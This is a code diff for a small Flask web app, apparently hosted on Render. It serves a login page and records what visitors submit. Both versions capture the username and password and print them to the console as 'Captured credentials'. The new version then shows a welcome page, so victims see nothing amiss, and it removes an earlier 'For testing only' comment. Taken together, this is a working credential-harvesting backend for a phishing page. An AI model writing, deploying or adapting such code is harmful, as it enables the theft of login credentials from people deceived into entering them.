@@ -1,18 +1,23 @@
-from flask import Flask, request, jsonify
+from flask import Flask, render_template, request
 
 app = Flask(__name__)
 
-@app.route('/login', methods=['POST'])
+@app.route('/')
+def home():
+    return render_template('home.html')
+
+@app.route('/login', methods=['GET', 'POST'])
 def login():
-    data = request.form  # Capture login credentials
-    username = data.get("username")
-    password = data.get("password")
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        print(f"Captured credentials -> Username: {username}, Password: {password}")  # Logs credentials to console
+        return render_template('welcome.html')
+    return render_template('login.html')
 
-    # Log captured credentials (For testing only)
-    print(f"Captured Credentials - Username: {username}, Password: {password}")
+@app.route('/welcome')
+def welcome():
+    return render_template('welcome.html')
 
-    return jsonify({"status": "success", "message": "Data captured"})
-
-if __name__ == "__main__":
-    from os import environ
-    app.run(host="0.0.0.0", port=int(environ.get("PORT", 5000)))
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=10000)  # Runs on Render's provided port
